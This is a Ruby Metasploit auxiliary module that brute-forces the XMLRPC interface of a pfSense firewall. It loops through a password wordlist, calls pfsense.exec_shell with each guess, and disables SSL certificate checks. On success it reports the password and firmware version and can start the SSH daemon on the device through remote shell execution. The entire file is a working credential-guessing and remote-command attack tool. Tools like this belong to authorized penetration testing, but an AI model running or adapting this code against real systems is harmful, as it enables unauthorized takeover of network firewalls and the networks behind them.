##
# $Id$
##

require 'msf/core'
require 'net/https'
require 'net/http'
require 'xmlrpc/client'

class Metasploit3 < Msf::Auxiliary

  def initialize(info = {})
       super(update_info(info,
           'Name'           => 'PfSense XMLRPC Brute Force',
           'Description'    => %q{
                   This module execute Brute Force in XMLRPC Server of PfSense Firewall.
           },
           'Author'         => [ 'Neriberto C.Prado <neriberto[at]mundolivre.eti.br>' ],
           'License'        => BSD_LICENSE,
           'Version'        => '$Revision: 0.1 $',
           'Privileged'     => false,
           'Platform'       => [ 'BSD' ],
           'DefaultTarget'  => 0
           ))

       register_options(
           [
               OptString.new('RHOST', [ true,  "Remote Host", 'https://192.168.56.10/xmlrpc.php']),
               OptString.new('PASS_FILE', [ true,  "File containing passwords, one per line", 'passwords.txt']),
               OptBool.new('START_SSHD',[ false, "Initialize SSH Server when login successful",'false']),
           ], self.class
           )
	end

	def run
		target = datastore['RHOST']
		wordlist = datastore['PASS_FILE']
		::File.open(wordlist, "rb").each_line do |line|
			print_status("Trying with password: #{line}")
			server = XMLRPC::Client.new2(target)
			# no verify ssl certificate
			server.instance_variable_get(:@http).instance_variable_set(:@verify_mode, OpenSSL::SSL::VERIFY_NONE)
			result = server.call("pfsense.exec_shell", "#{line.chomp}", "ls -lh")
			if (result == TRUE)
				print_status("Password found: #{line.chomp}")
				result = server.call("pfsense.host_firmware_version", "#{line.chomp}")
				firmware = result['firmware']['version']
				print_status("Firmware Version: #{firmware}")
				if (datastore['START_SSHD'])
					result = server.call("pfsense.exec_shell", "#{line.chomp}", "/etc/rc.d/sshd onestart")
					if (result == TRUE)
						print_status("SSH Server enabling in #{target}")
					end
				end
				break # stop the loop in wordlist
			end
		end
	end

end # for the class definition
